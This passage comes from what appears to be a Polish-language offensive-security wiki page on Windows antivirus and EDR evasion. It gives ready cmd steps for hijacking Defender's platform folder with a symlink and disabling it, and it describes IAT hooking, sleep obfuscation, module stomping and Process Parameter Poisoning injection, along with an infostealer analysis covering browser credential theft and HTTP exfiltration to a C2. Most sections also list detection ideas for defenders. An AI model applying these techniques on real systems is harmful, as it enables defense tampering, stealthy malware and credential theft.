- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender wybiera platformę, z której działa, enumerując podkatalogi w:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Wybiera podkatalog z najwyższym leksykograficznie ciągiem wersji (np. `4.18.25070.5-0`), a następnie uruchamia stamtąd procesy usługi Defender (odpowiednio aktualizując ścieżki usługi/rejestru). Ta selekcja ufa wpisom katalogowym, w tym directory reparse points (symlinkom). Administrator może wykorzystać to do przekierowania Defender do ścieżki zapisywalnej przez atakującego i uzyskania DLL sideloadingu lub spowodowania service disruption.

Preconditions
- Local Administrator (wymagane do tworzenia katalogów/symlinków w folderze Platform)
- Możliwość wykonania rebootu lub wywołania ponownej selekcji platformy Defender (restart usługi podczas boot)
- Wymagane są wyłącznie wbudowane narzędzia (`mklink`)

Dlaczego to działa
- Defender blokuje zapisy we własnych folderach, ale jego selekcja platformy ufa wpisom katalogowym i wybiera leksykograficznie najwyższą wersję bez sprawdzania, czy target wskazuje na chronioną/zaufaną ścieżkę.

Step-by-step (example)
1) Przygotuj zapisywalny klon bieżącego folderu platformy, np. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Utwórz wewnątrz Platform dowiązanie symboliczne katalogu o wyższej wersji wskazujące na twój folder:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Wybór triggera (zalecany reboot):
```cmd
shutdown /r /t 0
```
4) Zweryfikuj, czy MsMpEng.exe (WinDefend) jest uruchamiany ze przekierowanej ścieżki:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Powinieneś zaobserwować nową ścieżkę procesu w `C:\TMP\AV\` oraz konfigurację usługi/rejestru odzwierciedlającą tę lokalizację.

Opcje post-exploitation
- DLL sideloading/code execution: Upuść/zastąp biblioteki DLL ładowane przez Defendera z jego katalogu aplikacji, aby wykonać kod w procesach Defendera. Zobacz powyższą sekcję: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Usuń version-symlink, aby przy następnym uruchomieniu skonfigurowana ścieżka nie mogła zostać rozwiązana, a Defender nie uruchomił się:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Należy pamiętać, że ta technika sama w sobie nie zapewnia eskalacji uprawnień; wymaga praw administratora.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Zespoły red team mogą przenieść evasion z implantu C2 bezpośrednio do docelowego modułu, hookując jego Import Address Table (IAT) i kierując wybrane API przez kontrolowany przez atakującego, position-independent code (PIC). Uogólnia to evasion poza niewielki zestaw API udostępniany przez wiele kitów (np. CreateProcessA) i rozszerza te same zabezpieczenia na BOFs oraz post-exploitation DLLs.

Podejście wysokiego poziomu
- Umieść blob PIC obok docelowego modułu za pomocą reflective loadera (poprzedzającego moduł lub towarzyszącego mu). PIC musi być samowystarczalny i position-independent.
- Podczas ładowania host DLL przejdź przez jej IMAGE_IMPORT_DESCRIPTOR i zmodyfikuj wpisy IAT dla wybranych importów (np. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc), aby wskazywały na cienkie wrappery PIC.
- Każdy wrapper PIC wykonuje evasion przed wywołaniem właściwego API za pomocą tail-call. Typowe techniki evasion obejmują:
- Maskowanie/odmaskowanie pamięci wokół wywołania (np. szyfrowanie regionów beacona, zmiana RWX→RX, zmiana nazw/uprawnień stron), a następnie przywrócenie stanu po wywołaniu.
- Call-stack spoofing: skonstruowanie benign stack i przejście do docelowego API, aby analiza call stacka wskazywała oczekiwane ramki.
- Dla zapewnienia kompatybilności wyeksportuj interfejs, aby skrypt Aggressor (lub odpowiednik) mógł rejestrować API do hookowania dla Beacona, BOFs i post-ex DLLs.

Dlaczego tutaj IAT hooking
- Działa dla dowolnego kodu korzystającego z hookowanego importu, bez modyfikowania kodu narzędzia i bez polegania na Beaconie jako proxy dla określonych API.
- Obejmuje post-ex DLLs: hookowanie LoadLibrary* pozwala przechwytywać ładowanie modułów (np. System.Management.Automation.dll, clr.dll) i stosować to samo maskowanie/stack evasion do ich wywołań API.
- Przywraca niezawodne korzystanie z post-ex commands uruchamiających procesy w środowiskach z detekcją opartą na call stacku, opakowując CreateProcessA/W.

Minimalny szkic IAT hooka (pseudokod x64 C/C++)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notes
- Zastosuj patch po relokacjach/ASLR i przed pierwszym użyciem importu. Reflective loaders, takie jak TitanLdr/AceLdr, pokazują hooking podczas DllMain załadowanego modułu.
- Utrzymuj wrappers małe i bezpieczne dla PIC; rozwiąż prawdziwe API za pomocą oryginalnej wartości IAT przechwyconej przed patchowaniem albo przez LdrGetProcedureAddress.
- Stosuj przejścia RW → RX dla PIC i unikaj pozostawiania stron jednocześnie zapisywalnych i wykonywalnych.

Call-stack spoofing stub
- Stub-y PIC w stylu Draugr budują fałszywy łańcuch wywołań (adresy powrotu prowadzące do benign modules), a następnie wykonują pivot do prawdziwego API.
- Omija to detekcje oczekujące canonical stacks z Beacon/BOFs do wrażliwych API.
- Łącz to z technikami stack cutting/stack stitching, aby przed prologiem API znaleźć się wewnątrz oczekiwanych frames.

Operational integration
- Dodaj reflective loader przed post-ex DLLs, aby PIC i hooks inicjalizowały się automatycznie podczas ładowania DLL.
- Użyj Aggressor script do rejestracji target APIs, aby Beacon i BOFs mogły transparentnie korzystać z tej samej ścieżki evasion bez zmian w kodzie.

Detection/DFIR considerations
- IAT integrity: wpisy rozwiązujące się do adresów non-image (heap/anon); okresowa weryfikacja import pointers.
- Stack anomalies: adresy powrotu nienależące do loaded images; nagłe przejścia do non-image PIC; niespójne RtlUserThreadStart ancestry.
- Loader telemetry: zapisy IAT wykonywane wewnątrz procesu, wczesna aktywność DllMain modyfikująca import thunks, nieoczekiwane regiony RX tworzone podczas ładowania.
- Image-load evasion: jeśli hookingujesz LoadLibrary*, monitoruj podejrzane ładowanie automation/clr assemblies skorelowane ze zdarzeniami memory masking.

Related building blocks and examples
- Reflective loaders wykonujące IAT patching podczas ładowania (np. TitanLdr, AceLdr)
- Memory masking hooks (np. simplehook) i stack-cutting PIC (stackcutting)
- PIC call-stack spoofing stubs (np. Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hooks via a resident PICO

Jeśli kontrolujesz reflective loader, możesz hookować importy **podczas** `ProcessImports()`, zastępując wskaźnik loadera `GetProcAddress` własnym resolverem, który najpierw sprawdza hooks:

- Zbuduj **resident PICO** (persistent PIC object), który przetrwa zwolnienie transient loader PIC.
- Wyeksportuj funkcję `setup_hooks()`, która nadpisuje import resolver loadera (np. `funcs.GetProcAddress = _GetProcAddress`).
- W `_GetProcAddress` pomijaj ordinal imports i użyj hash-based hook lookup, takiego jak `__resolve_hook(ror13hash(name))`. Jeśli hook istnieje, zwróć go; w przeciwnym razie przekaż wywołanie do prawdziwego `GetProcAddress`.
- Zarejestruj hook targets podczas linkowania za pomocą wpisów Crystal Palace `addhook "MODULE$Func" "hook"`. Hook pozostaje prawidłowy, ponieważ znajduje się wewnątrz resident PICO.

Zapewnia to **import-time IAT redirection** bez patchowania sekcji kodu załadowanej DLL po zakończeniu ładowania.

### Forcing hookable imports when the target uses PEB-walking

Import-time hooks zadziałają tylko wtedy, gdy dana funkcja rzeczywiście znajduje się w IAT targetu. Jeśli moduł rozwiązuje API za pomocą PEB-walk + hash (bez import entry), wymuś rzeczywisty import, aby ścieżka `ProcessImports()` loadera mogła go obsłużyć:

- Zastąp hashed export resolution (np. `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) bezpośrednim odwołaniem, takim jak `&WaitForSingleObject`.
- Kompilator wygeneruje wpis IAT, umożliwiając interception podczas rozwiązywania importów przez reflective loader.

### Ekko-style sleep/idle obfuscation without patching `Sleep()`

Zamiast patchować `Sleep`, hookuj **rzeczywiste wait/IPC primitives**, których używa implant (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). W przypadku długich oczekiwań opakuj wywołanie w obfuscation chain w stylu Ekko, która szyfruje in-memory image podczas bezczynności:

- Użyj `CreateTimerQueueTimer` do zaplanowania sekwencji callbacks wywołujących `NtContinue` z przygotowanymi frames `CONTEXT`.
- Typowy chain (x64): ustaw image na `PAGE_READWRITE` → wykonaj szyfrowanie RC4 przez `advapi32!SystemFunction032` na całym mapped image → wykonaj blocking wait → odszyfruj RC4 → **przywróć per-section permissions**, przechodząc po sekcjach PE → zasygnalizuj zakończenie.
- `RtlCaptureContext` dostarcza szablon `CONTEXT`; sklonuj go do wielu frames i ustaw registers (`Rip/Rcx/Rdx/R8/R9`), aby wywoływać poszczególne steps.

Szczegół operacyjny: zwracaj “success” dla długich waits (np. `WAIT_OBJECT_0`), aby caller kontynuował działanie, gdy image jest zamaskowany. Ten pattern ukrywa moduł przed scannerami podczas idle windows i unika klasycznej sygnatury “patched `Sleep()`”.

Detection ideas (telemetry-based)
- Serie callbacks `CreateTimerQueueTimer` wskazujących na `NtContinue`.
- `advapi32!SystemFunction032` używane na dużych, ciągłych buffers o rozmiarze image.
- `VirtualProtect` dla dużego zakresu, po którym następuje custom per-section permission restoration.

### Runtime CFG registration for sleep-obfuscation gadgets

Na targetach z włączonym CFG pierwszy indirect jump do mid-function gadget, takiego jak `jmp [rbx]` lub `jmp rdi`, zwykle zakończy się crashem procesu z `STATUS_STACK_BUFFER_OVERRUN`, ponieważ gadget nie znajduje się w CFG metadata modułu. Aby utrzymać chains w stylu Ekko/Kraken w hardened processes:

- Zarejestruj każdy indirect destination używany przez chain za pomocą `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` i wpisów `CFG_CALL_TARGET_VALID`.
- Dla adresów wewnątrz loaded images (`ntdll`, `kernel32`, `advapi32`) `MEMORY_RANGE_ENTRY` musi zaczynać się od **image base** i obejmować **pełny image size**.
- Dla manually mapped/PIC/stomped regions użyj **allocation base** i **allocation size**.
- Oznacz nie tylko dispatch gadget, lecz także exports osiągane pośrednio (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event syscalls) oraz dowolne attacker-controlled executable sections, które staną się indirect targets.

Zmienia to sleep chains w stylu ROP/JOP z “works only in non-CFG processes” w wielokrotnego użytku primitive dla `explorer.exe`, browsers, `svchost.exe` i innych endpoints skompilowanych z `/guard:cf`.

### CET-safe stack spoofing for sleeping threads

Pełna zamiana `CONTEXT` jest noisy i może powodować problemy w systemach z CET Shadow Stack, ponieważ spoofed `Rip` nadal musi być zgodny z hardware shadow stack. Bezpieczniejszy pattern sleep-masking to:

- Wybierz inny thread w tym samym procesie i odczytaj jego `NT_TIB` / TEB stack bounds (`StackBase`, `StackLimit`) przez `NtQueryInformationThread`.
- Wykonaj backup rzeczywistego TEB/TIB bieżącego threadu.
- Przechwyć rzeczywisty sleeping context za pomocą `GetThreadContext`.
- Skopiuj **wyłącznie** rzeczywisty `Rip` do spoof context, pozostawiając spoofed `Rsp`/stack state bez zmian.
- Podczas sleep window skopiuj `NT_TIB` spoof threadu do bieżącego TEB, aby stack walkers wykonywały unwind wewnątrz legitimate stack range.
- Po zakończeniu wait przywróć oryginalny TIB i thread context.

Zachowuje to CET-consistent instruction pointer, jednocześnie wprowadzając w błąd EDR stack walkers, które ufają TEB stack metadata przy walidowaniu unwindów.

### APC-based alternative: Kraken Mask

Jeśli timer-queue dispatch jest zbyt charakterystyczny, tę samą sekwencję sleep-encrypt-spoof-restore można wykonać z suspended helper threadu za pomocą queued APCs:

- Utwórz helper thread z `NtTestAlert` jako entrypoint.
- Umieść przygotowane `CONTEXT` frames/APCs w kolejce za pomocą `NtQueueApcThread` i opróżniaj je przez `NtAlertResumeThread`.
- Przechowuj chain state na heapie zamiast na helper stack, aby uniknąć wyczerpania domyślnego 64 KB thread stack.
- Użyj `NtSignalAndWaitForSingleObject`, aby atomowo zasygnalizować start event i zablokować działanie.
- Wstrzymaj main thread przed przywróceniem TIB/context (`NtSuspendThread` → restore → `NtResumeThread`), aby ograniczyć race window, w którym scanner mógłby przechwycić częściowo przywrócony stack.

Zastępuje to sygnaturę `CreateTimerQueueTimer` + `NtContinue` sygnaturą helper-thread/APC, zachowując te same cele RC4 masking i stack spoofing.

Additional detection ideas
- `NtSetInformationVirtualMemory` z `VmCfgCallTargetInformation` krótko przed sleeps, waits lub APC dispatch.
- `GetThreadContext`/`SetThreadContext` opakowane wokół `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` lub `ConnectNamedPipe`.
- `NtQueryInformationThread`, po którym następują bezpośrednie zapisy do stack bounds bieżącego threadu w TEB/TIB.
- Chains `NtQueueApcThread`/`NtAlertResumeThread`, które pośrednio docierają do `SystemFunction032`, `VirtualProtect` lub helpers przywracających section permissions.
- Wielokrotne użycie krótkich gadget signatures, takich jak `FF 23` (`jmp [rbx]`) lub `FF E7` (`jmp rdi`), jako dispatch pivots wewnątrz signed modules.


## Precision Module Stomping

Module stomping wykonuje payloady z **sekcji `.text` DLL już zmapowanej wewnątrz target process**, zamiast przydzielać oczywistą private executable memory lub ładować nową sacrificial DLL. Wybrany overwrite target powinien być **loaded, disk-backed image**, którego code space może pomieścić payload bez uszkadzania code paths nadal potrzebnych procesowi.

### Reliable target selection

Naive stomping przeciwko common modules, takim jak `uxtheme.dll` lub `comctl32.dll`, jest kruche: DLL może nie być załadowana w remote process, a zbyt mały code region spowoduje crash procesu. Bardziej niezawodny workflow:

1. Wylicz modules target process i zachowaj **names-only include list** już załadowanych DLLs.
2. Najpierw zbuduj payload i zapisz jego **dokładny rozmiar w bajtach**.
3. Przeskanuj candidate DLLs na dysku i porównaj PE section **`.text` `Misc_VirtualSize`** z rozmiarem payloadu. Ma to większe znaczenie niż file size, ponieważ odzwierciedla rozmiar executable section **po zmapowaniu w memory**.
4. Przeanalizuj **Export Address Table (EAT)** i wybierz exported function RVA jako stomp start offset.
5. Oblicz **blast radius**: jeśli payload przekracza boundary wybranej funkcji, nadpisze sąsiednie exports ułożone za nią w memory.

Typowe recon/selection helpers spotykane w praktyce:
```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```
Notatki operacyjne
- Preferuj biblioteki DLL **już załadowane** w zdalnym procesie, aby uniknąć telemetryki `LoadLibrary`/nieoczekiwanych załadowań obrazów.
- Preferuj eksporty, które są rzadko wykonywane przez aplikację docelową; w przeciwnym razie zwykłe ścieżki kodu mogą trafić na zmodyfikowane bajty przed utworzeniem wątku lub po nim.
- Duże implanty często wymagają zmiany sposobu osadzania shellcode z literału stringowego na **tablicę bajtów/inicjalizator w nawiasach klamrowych**, aby cały bufor był prawidłowo reprezentowany w kodzie injectora.

Pomysły na wykrywanie
- Zdalne zapisy do **wykonywalnych stron opartych na obrazie** (`MEM_IMAGE`, `PAGE_EXECUTE*`) zamiast częściej spotykanych prywatnych alokacji RWX/RX.
- Punkty wejścia eksportów, których bajty w pamięci nie odpowiadają plikowi źródłowemu na dysku.
- Zdalne wątki lub przełączenia kontekstu, które rozpoczynają wykonywanie wewnątrz legalnego eksportu DLL, którego pierwsze bajty zostały niedawno zmodyfikowane.
- Podejrzane sekwencje `VirtualProtect(Ex)` / `WriteProcessMemory` dotyczące stron `.text` DLL, po których następuje utworzenie wątku.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) to technika **process-injection / EDR-evasion**, która omija klasyczną ścieżkę zdalnego zapisu (`VirtualAllocEx` + `WriteProcessMemory`). Zamiast kopiować bajty do już uruchomionego celu, wykorzystuje fakt, że Windows **kopiuje wybrane parametry startowe `CreateProcessW` do procesu potomnego** i przechowuje je w `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).

### Nośniki podatne na poisoning, kopiowane przez `CreateProcessW`

Przydatne nośniki to:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (z `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Praktyczne ograniczenia nośników:

- `lpCommandLine` musi wskazywać **zapisywalną pamięć** dla `CreateProcessW` i jest ograniczony do **32 767 znaków Unicode**, wliczając terminator null.
- `lpEnvironment` musi być blokiem środowiska Unicode z kolejnymi stringami `NAME=VALUE\0`, zakończonym dodatkowym `\0`.
- `lpReserved` jest oficjalnie zarezerwowane, dlatego mapowanie `ShellInfo` należy traktować jako szczegół implementacyjny, a nie stabilny, udokumentowany kontrakt.

Dzięki temu zwykłe tworzenie procesu staje się **prymitywem transferu payloadu**. Operator tworzy proces potomny z kontrolowanymi przez atakującego danymi startowymi i pozwala Windows wykonać kopiowanie między procesami.

### Zdalny przebieg wyszukiwania bez zdalnych API zapisu

Po utworzeniu procesu potomnego odczytaj skopiowany bufor za pomocą prymitywów **tylko do odczytu**:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → pobierz `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Odczytaj zdalny `PEB`
3. Podąż za `PEB.ProcessParameters`
4. Odczytaj `RTL_USER_PROCESS_PARAMETERS`
5. Użyj wybranego wskaźnika:
- `parameters.CommandLine.Buffer`
- `parameters.Environment`
- `parameters.ShellInfo.Buffer`

Minimalny przebieg:
```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```
### Wykonywanie skopiowanego bufora parametrów

Skopiowany region parametrów jest zwykle `RW`, a nie wykonywalny. Typowy łańcuch P3 wygląda następująco:

1. Utwórz proces normalnie (nie w stanie suspended)
2. Ustaw uprawnienia wykonywania dla wybranej strony parametrów za pomocą `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Ponownie wykorzystaj uchwyt głównego wątku zwrócony w `PROCESS_INFORMATION`
4. Przekieruj wykonanie za pomocą `NtSetContextThread` (`CONTEXT_CONTROL`, nadpisanie `RIP`)

W odróżnieniu od klasycznych workflows związanych z thread hijacking, nie wymaga to `SuspendThread` / `ResumeThread`; context można zmienić bezpośrednio na zwróconym uchwycie głównego wątku.

Pozwala to uniknąć kilku API często monitorowanych pod kątem injection:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- często również `SuspendThread` / `ResumeThread`

### Ograniczenie związane z null-byte i staged shellcode

Wszystkie trzy carriers to **string lub dane przypominające string**, dlatego raw payload zawierający `0x00` zostaje obcięty podczas transferu. Praktycznym obejściem jest **null-free first stage**, który rekonstruuje constants w runtime, a następnie ładuje dowolny second stage.

Prosty pattern polega na syntezie constants opartej na XOR:
```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```
To pozwala pierwszemu etapowi budować stringi stosu, argumenty API, ścieżki DLL lub loader shellcode drugiego etapu bez osadzania bajtów null w transportowanym parametrze.

### Wywołania API oparte na stosie z pierwszego etapu

Gdy pierwszy etap musi wywołać API, takie jak `LoadLibraryA`, może:

- umieścić string/bufor na stosie celu
- zarezerwować **32-bajtowy x64 shadow space**
- ustawić `RCX`, `RDX`, `R8`, `R9` na stałe wartości lub wskaźniki względne względem `RSP`
- zachować **16-bajtowe wyrównanie `RSP`** przed wywołaniem

Drugi etap może następnie zostać skopiowany ze stosu do alokacji `PAGE_READWRITE`, zmienionej na `PAGE_EXECUTE_READ` za pomocą `VirtualProtect`, a następnie wykonany, co pozwala uniknąć bezpośredniej alokacji RWX.

### Pomysły na detekcję

Dobre możliwości huntingu wymienione przez autorów:

- `VirtualProtectEx` / `NtProtectVirtualMemory` ustawiające strony parametrów procesu jako wykonywalne
- taka zmiana ochrony, po której następuje `SetThreadContext` / `NtSetContextThread`
- zdalne odczyty `PEB`, a następnie `RTL_USER_PROCESS_PARAMETERS`
- nietypowo długie wartości lub wartości o wysokiej entropii w `lpCommandLine`, `lpEnvironment` lub `STARTUPINFO.lpReserved` podczas tworzenia procesu

### Uwagi

- P3 to **trick transferu między procesami**, a nie pełna primitive wykonawcza: skopiowany parametr nadal wymaga zmiany uprawnień na wykonywanie oraz metody przekierowania wykonania.
- `RtlCreateProcessReflection` / Dirty Vanity zostało rozważone przez autorów, ale odrzucone, ponieważ wewnętrznie korzysta z podejrzanych primitives, takich jak `NtWriteVirtualMemory` i `NtCreateThreadEx`.

## Tradecraft SantaStealer na potrzeby bezplikowego unikania detekcji i kradzieży danych uwierzytelniających

SantaStealer (aka BluelineStealer) pokazuje, jak współczesne info-stealery łączą AV bypass, anti-analysis i dostęp do danych uwierzytelniających w jednym workflow.

### Filtrowanie według układu klawiatury i opóźnienie sandboxa

- Flaga konfiguracji (`anti_cis`) wylicza zainstalowane układy klawiatury za pomocą `GetKeyboardLayoutList`. Jeśli zostanie znaleziony układ cyrylicki, sample tworzy pusty znacznik `CIS` i kończy działanie przed uruchomieniem stealerów, dzięki czemu nigdy nie detonuje się w wykluczonych lokalizacjach, pozostawiając jednocześnie artifact przydatny w huntingu.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Warstwowa logika `check_antivm`

- Wariant A przechodzi przez listę procesów, oblicza dla każdej nazwy hash za pomocą niestandardowej sumy kroczącej i porównuje go z wbudowanymi listami blokad debuggerów/sandboxów; powtarza obliczanie sumy dla nazwy komputera i sprawdza katalogi robocze, takie jak `C:\analysis`.
- Wariant B analizuje właściwości systemu (minimalną liczbę procesów, niedawny czas działania), wywołuje `OpenServiceA("VBoxGuest")` w celu wykrycia dodatków VirtualBox oraz wykonuje kontrole czasu wokół operacji uśpienia, aby wykryć single-stepping. Każde wykrycie powoduje przerwanie działania przed uruchomieniem modułów.

### Fileless helper + podwójne reflective loading z użyciem ChaCha20

- Główny DLL/EXE zawiera helpera Chromium do kradzieży danych uwierzytelniających, który jest zapisywany na dysku albo mapowany ręcznie w pamięci; w trybie fileless samodzielnie rozwiązuje importy i relokacje, dzięki czemu żadne artefakty helpera nie są zapisywane.
- Helper przechowuje DLL drugiego etapu, dwukrotnie zaszyfrowany za pomocą ChaCha20 (dwa klucze 32-bajtowe + 12-bajtowe nonce). Po obu etapach blob jest ładowany refleksyjnie (bez `LoadLibrary`), a następnie wywoływane są eksporty `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup`, wyprowadzone z [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).
- Procedury ChromElevator wykorzystują reflective process hollowing oparte na direct syscalls do wstrzyknięcia kodu do aktywnej przeglądarki Chromium, dziedziczą klucze AppBound Encryption i odszyfrowują hasła, cookies oraz dane kart płatniczych bezpośrednio z baz SQLite, pomimo wzmocnień ABE.


### Modularne zbieranie w pamięci i eksfiltracja HTTP w porcjach

- `create_memory_based_log` iteruje po globalnej tabeli wskaźników do funkcji `memory_generators` i uruchamia po jednym wątku dla każdego włączonego modułu (Telegram, Discord, Steam, zrzuty ekranu, dokumenty, rozszerzenia przeglądarek itd.). Każdy wątek zapisuje wyniki do współdzielonych buforów i zgłasza liczbę plików po około 45-sekundowym oknie oczekiwania na zakończenie.
- Po zakończeniu wszystkie dane są kompresowane statycznie dołączoną biblioteką `miniz` jako `%TEMP%\\Log.zip`. Następnie `ThreadPayload1` odczekuje 15 sekund i przesyła archiwum w porcjach po 10 MB za pomocą HTTP POST do `http://<C2>:6767/upload`, podszywając się pod granicę `multipart/form-data` przeglądarki (`----WebKitFormBoundary***`). Do każdej porcji dodawane są `User-Agent: upload`, `auth: <build_id>` oraz opcjonalne `w: <campaign_tag>`, a do ostatniej porcji dołączane jest `complete: true`, aby C2 wiedział, że ponowne złożenie zostało zakończone.

## References

- [Advanced Evasion Tradecraft: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [Sleeping Beauty: Putting Adaptix to Bed with Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [SensePost – Process Parameter Poisoning](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [Sleeping Beauty II: CFG, CET, and Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)

{{#include ../banners/hacktricks-training.md}}
